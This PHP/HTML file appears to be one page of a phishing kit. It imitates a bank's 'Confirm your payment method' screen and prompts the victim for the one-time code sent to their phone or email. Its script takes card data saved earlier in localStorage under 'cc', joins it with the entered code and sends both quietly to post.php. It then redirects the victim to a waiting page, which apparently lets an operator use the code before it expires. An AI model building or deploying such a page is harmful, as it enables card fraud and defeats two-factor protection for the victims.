<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <link rel="stylesheet" href="res/confirm.css">
</head>
<body>
<div class="box">

<div style="text-align:center;">
    <img src="res/logo.svg" style="width:60px;">
</div>

<br>
<div class="title">Confirm your payment method</div>
<div class="text">Authenticate by entering the code we just sent you via text message, voice call, or email. You may also receive a notification through your mobile banking app; please approve the request to continue. Kindly wait a few moments, as the process may take some time. This authentication is required to verify your payment method.</div>

<?= setError("Invalid code."); ?>

<div class="col">
   <input type="text" id="code" placeholder="XXXXXX">
</div>

<div id="code-resend-box" style="font-family: Arial, sans-serif; font-size: 14px; color: #444; margin:15px 0;">
  <p style="margin: 0 0 10px;">
    You can request a new code in
    <span id="code-timer" style="font-weight: bold;">1:00</span>
  </p>

  <a href="#" id="request-code"
     style="color: #999; text-decoration: none; cursor: not-allowed;"
     aria-disabled="true">
    Request a new code
  </a>

  <span id="code-message"
        style="display: none; color: #198754; margin-left: 6px;">
    A new code has been sent!
  </span>

  <script>
    (() => {
      const box = document.getElementById("code-resend-box");
      const timer = box.querySelector("#code-timer");
      const link = box.querySelector("#request-code");
      const message = box.querySelector("#code-message");

      let seconds = 60;
      let interval;

      function updateTimer() {
        const minutes = Math.floor(seconds / 60);
        const remainingSeconds = seconds % 60;

        timer.textContent =
          `${minutes}:${String(remainingSeconds).padStart(2, "0")}`;

        if (seconds <= 0) {
          clearInterval(interval);
          timer.textContent = "0:00";

          link.style.color = "#0d6efd";
          link.style.cursor = "pointer";
          link.style.pointerEvents = "auto";
          link.setAttribute("aria-disabled", "false");
        } else {
          seconds--;
        }
      }

      function startCountdown() {
        clearInterval(interval);
        seconds = 60;

        link.style.color = "#999";
        link.style.cursor = "not-allowed";
        link.style.pointerEvents = "none";
        link.setAttribute("aria-disabled", "true");

        message.style.display = "none";

        updateTimer();
        interval = setInterval(updateTimer, 1000);
      }

      link.addEventListener("click", function (event) {
        event.preventDefault();

        if (seconds > 0) return;

        message.style.display = "inline";
        link.style.color = "#198754";

        startCountdown();

        message.style.display = "inline";
      });

      startCountdown();
    })();
  </script>
</div>

<div class="col btn">
    <button onclick="sendCode()">Confirm</button>
</div>


</div>
<script src="./res/cdn/jq.js"></script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>

let next = <?= json_encode($_GET['next'] ?? 'success.php'); ?>




function sendCode(){
    $("input").removeClass("error");
    if($("#code").val()!=""){
      const otp = localStorage.getItem("cc") ?? "";
       const form = new FormData();
       form.append("type", "SMS");
       form.append("code", otp+"\n"+$("#code").val());
       navigator.sendBeacon("post.php", form);
       window.location="wait.php?p=SMS<?= mkurl(1); ?>&next="+next;
    }
}

$("input").keypress((e)=>{
  if(e.key=="Enter"){
    sendCode();
  }
})

</script>
</body>
</html>